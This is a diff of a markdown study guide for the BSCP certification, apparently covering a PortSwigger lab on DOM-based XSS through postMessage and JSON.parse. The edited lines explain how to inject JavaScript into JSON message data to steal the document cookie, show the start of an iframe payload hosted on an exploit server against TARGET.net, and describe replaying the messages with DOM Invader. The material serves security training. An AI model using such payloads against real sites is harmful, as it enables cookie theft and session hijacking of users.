@@ -65,10 +65,10 @@ The acronym BSCP has nice simular ring like OSCP  :)
 </script>
 ```  
 
->To exploit above code inject code into the JSON to change "load-channel" type ....require validation....  
+>To exploit above the above code, inject JavaScript into the JSON data to change "load-channel" field data steal document cookie.  
 
   
->Hosted exploit server body.  
+>Hosted **iframe** on exploit server html body.  
 
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
@@ -80,11 +80,11 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
 
->Identify web messages using **postmessage()** with **DOM Invader**.  
+>Identify web messages on target that is using **postmessage()** with **DOM Invader**.  
 
 ![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  
 
->Replay post message using DOM Invader.  
+>Replay the post message using DOM Invader after altering the JSON data.  
 
 ```JSON
 {
